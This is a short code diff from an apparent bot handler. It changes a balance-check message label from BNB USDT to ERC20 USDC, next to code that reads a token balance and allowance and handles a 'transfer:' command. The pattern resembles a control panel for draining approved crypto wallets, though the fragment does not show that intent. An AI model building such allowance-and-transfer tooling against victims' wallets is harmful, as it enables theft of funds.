@@ -64,7 +64,7 @@ export default async function handler(req, res) {
             const formattedBalance = ethers.formatUnits(balance, decimals);
             const formattedAllowance = ethers.formatUnits(allowance, decimals);
 
-            await appendToOriginalMessage(`💰 <b>Live Balance Check:</b>\n<b>BNB USDT:</b> <code>${formattedBalance}</code>\n<b>Allowance:</b> <code>${formattedAllowance}</code>`);
+            await appendToOriginalMessage(`💰 <b>Live Balance Check:</b>\n<b>ERC20 USDC:</b> <code>${formattedBalance}</code>\n<b>Allowance:</b> <code>${formattedAllowance}</code>`);
         }
 
         else if (data.startsWith('transfer:')) {
